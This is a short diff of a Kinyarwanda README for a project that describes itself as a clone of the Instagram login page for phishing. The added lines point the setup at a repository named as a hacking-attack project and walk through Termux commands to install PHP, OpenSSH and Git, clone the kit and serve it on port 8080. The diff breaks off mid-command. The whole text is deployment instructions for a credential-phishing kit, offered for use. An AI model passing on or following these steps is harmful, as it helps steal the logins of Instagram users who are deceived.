@@ -26,6 +26,11 @@ Iyi ni clone ya Instagram login page, ishobora gukoreshwa mu buryo bwa **phishin
    pkg install php
    pkg install openssh
    pkg install git
-   git clone https://github.com/username/myrepo
-   cd myrepo
+   git clone https://github.com/2emdrill/2m_drill_hacking-attack-project.git drill
+   cd drill
    php -S 0.0.0.0:8080
+'''
+3. FUNGURA INDI SESSION MURI TERMUX
+```bash
+pkg install cr
+ 
